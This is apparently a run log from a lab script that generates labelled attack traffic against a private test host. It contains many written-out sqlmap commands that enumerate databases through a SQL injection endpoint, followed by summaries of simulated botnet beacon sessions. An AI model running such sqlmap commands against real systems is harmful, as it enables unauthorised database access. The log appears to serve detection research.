+[webattack_aws_025] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_025] Logged. Duration: 11.32s
+[webattack_aws_026] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_026] Logged. Duration: 11.33s
+[webattack_aws_027] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_027] Logged. Duration: 11.32s
+[webattack_aws_028] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_028] Logged. Duration: 11.33s
+[webattack_aws_029] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_029] Logged. Duration: 11.33s
+[webattack_aws_030] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_030] Logged. Duration: 11.31s
+[webattack_aws_031] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_031] Logged. Duration: 11.32s
+[webattack_aws_032] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_032] Logged. Duration: 10.38s
+[webattack_aws_033] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_033] Logged. Duration: 11.32s
+[webattack_aws_034] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_034] Logged. Duration: 11.62s
+[webattack_aws_035] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_035] Logged. Duration: 11.32s
+[2026-09-04T20:32:34.531178] === Finished web_attack.py. Sleeping 60s before next category ===
+[2026-09-04T20:33:34.531342] === Flushing iptables before botnet_beacon_attack.py ===
+[2026-09-04T20:33:35.429003] Victim iptables flushed + management SSH rule re-added.
+[2026-09-04T20:33:35.429058] === Starting botnet_beacon_attack.py with 35 sessions ===
+[botnet_beacon_aws_001] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_001] Logged. Duration: 56.08s
+[botnet_beacon_aws_002] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_002] Logged. Duration: 56.07s
+[botnet_beacon_aws_003] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_003] Logged. Duration: 60.04s
+[botnet_beacon_aws_004] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_004] Logged. Duration: 56.07s
+[botnet_beacon_aws_005] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_005] Logged. Duration: 56.07s
+[botnet_beacon_aws_006] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_006] Logged. Duration: 60.04s
+[botnet_beacon_aws_007] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_007] Logged. Duration: 56.07s
+[botnet_beacon_aws_008] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_008] Logged. Duration: 56.08s
+[botnet_beacon_aws_009] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_009] Logged. Duration: 60.05s
+[botnet_beacon_aws_010] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_010] Logged. Duration: 56.07s
+[botnet_beacon_aws_011] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_011] Logged. Duration: 56.07s
+[botnet_beacon_aws_012] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_012] Logged. Duration: 60.04s
+[botnet_beacon_aws_013] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_013] Logged. Duration: 56.07s
+[botnet_beacon_aws_014] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_014] Logged. Duration: 56.07s
+[botnet_beacon_aws_015] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_015] Logged. Duration: 60.04s
+[botnet_beacon_aws_016] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_016] Logged. Duration: 56.07s
+[botnet_beacon_aws_017] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_017] Logged. Duration: 56.07s
+[botnet_beacon_aws_018] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_018] Logged. Duration: 60.04s
+[botnet_beacon_aws_019] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_019] Logged. Duration: 56.07s
+[botnet_beacon_aws_020] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_020] Logged. Duration: 56.07s
+[botnet_beacon_aws_021] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_021] Logged. Duration: 60.04s
+[botnet_beacon_aws_022] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_022] Logged. Duration: 56.07s
+[botnet_beacon_aws_023] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_023] Logged. Duration: 56.07s
+[botnet_beacon_aws_024] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_024] Logged. Duration: 60.04s
+[botnet_beacon_aws_025] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_025] Logged. Duration: 56.07s
+[botnet_beacon_aws_026] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_026] Logged. Duration: 56.07s
+[botnet_beacon_aws_027] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_027] Logged. Duration: 60.04s
+[botnet_beacon_aws_028] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_028] Logged. Duration: 56.07s
+[botnet_beacon_aws_029] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_029] Logged. Duration: 56.07s
+[botnet_beacon_aws_030] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_030] Logged. Duration: 60.04s
+[botnet_beacon_aws_031] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_031] Logged. Duration: 56.07s
+[botnet_beacon_aws_032] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_032] Logged. Duration: 56.07s
+[botnet_beacon_aws_033] Starting beacon campaign: 5 check-ins, 15s apart
+[botnet_beacon_aws_033] Logged. Duration: 60.04s
+[botnet_beacon_aws_034] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_034] Logged. Duration: 56.07s
+[botnet_beacon_aws_035] Starting beacon campaign: 8 check-ins, 8s apart
+[botnet_beacon_aws_035] Logged. Duration: 56.09s
+[2026-09-04T21:24:31.659179] === Finished botnet_beacon_attack.py. Sleeping 60s before next category ===
+[2026-09-04T21:25:31.659355] === ALL CATEGORIES COMPLETE ===
